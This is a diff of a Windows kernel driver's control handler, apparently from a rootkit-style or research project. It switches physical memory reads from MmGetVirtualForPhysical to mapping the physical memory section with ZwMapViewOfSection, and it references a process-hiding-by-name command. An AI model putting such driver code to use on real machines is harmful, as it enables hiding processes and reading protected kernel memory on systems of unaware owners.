@@ -70,7 +70,7 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
     PHIDE_PROCESS processHide = nullptr;
 
     //Variable for dereferencing paging structure
-    PVOID paging_struct_vaddr = nullptr;
+    //PVOID paging_struct_vaddr = nullptr;
 
     PAGED_CODE();
 
@@ -156,37 +156,37 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
             // Following WinPmem
             // The page tables is always mapped in the direct Kernel memory map (not sure is this the same thing as the kernel space in every process)
             // Work for windows 10 and 11
-            PHYSICAL_ADDRESS phys_address;
+            /*PHYSICAL_ADDRESS phys_address;
             phys_address.QuadPart = derefAddr->addr;
             paging_struct_vaddr = MmGetVirtualForPhysical(phys_address);
             DbgPrint("[NAK] :: [ ] Virtual address of paging structure: %llx from physical %llx\n", paging_struct_vaddr, derefAddr->addr);
             RtlCopyMemory((PVOID)outputData, paging_struct_vaddr, (SIZE_T)derefAddr->size);
-            DbgPrint("[NAK] :: [ ] Content of paging structure: %llx from physical %llx\n", *(ULONGLONG*)paging_struct_vaddr, derefAddr->addr);
+            DbgPrint("[NAK] :: [ ] Content of paging structure: %llx from physical %llx\n", *(ULONGLONG*)paging_struct_vaddr, derefAddr->addr);*/
 
             // Manually map physical memory to kernel space --> work well for windows 7
-            //if (openPhysicalMem() == STATUS_SUCCESS){
+            if (openPhysicalMem() == STATUS_SUCCESS){
 
-            //    LARGE_INTEGER offset;
-            //    offset.QuadPart = derefAddr->addr;
-            //    SIZE_T viewSize = PAGE_SIZE;
+                LARGE_INTEGER offset;
+                offset.QuadPart = derefAddr->addr;
+                SIZE_T viewSize = PAGE_SIZE;
 
-            //    ULONG page_offset = offset.QuadPart % PAGE_SIZE;
+                ULONG page_offset = offset.QuadPart % PAGE_SIZE;
 
 
-            //    PVOID mappedBuffer = nullptr;
-            //    ntStatus = ZwMapViewOfSection(physicalMemHandle, (HANDLE)-1, &mappedBuffer, 0, PAGE_SIZE, 
-            //                   &offset, &viewSize, ViewUnmap, 0, PAGE_READONLY);
+                PVOID mappedBuffer = nullptr;
+                ntStatus = ZwMapViewOfSection(physicalMemHandle, (HANDLE)-1, &mappedBuffer, 0, PAGE_SIZE, 
+                               &offset, &viewSize, ViewUnmap, 0, PAGE_READONLY);
 
-            //    if ((ntStatus != STATUS_SUCCESS) || (!mappedBuffer))
-            //    {
-            //        DbgPrint("Error: ZwMapViewOfSection failed. Offset 0x%llX, status %08x.\n", offset.QuadPart, ntStatus); // real error
-            //        break;
-            //    }
-            //    RtlCopyMemory((PVOID)outputData, (BYTE*)mappedBuffer + page_offset, derefAddr->size);
-            //    ZwUnmapViewOfSection((HANDLE)-1, mappedBuffer);
+                if ((ntStatus != STATUS_SUCCESS) || (!mappedBuffer))
+                {
+                    DbgPrint("Error: ZwMapViewOfSection failed. Offset 0x%llX, status %08x.\n", offset.QuadPart, ntStatus); // real error
+                    break;
+                }
+                RtlCopyMemory((PVOID)outputData, (BYTE*)mappedBuffer + page_offset, derefAddr->size);
+                DbgPrint("[NAK] :: [ ] Content of paging structure: %llx from physical %llx\n", *(ULONGLONG*)outputData, derefAddr->addr);
+                ZwUnmapViewOfSection((HANDLE)-1, mappedBuffer);
 
-            //}
-
+            }
             break;
 
         case HIDE_PROCESS_BY_NAME:
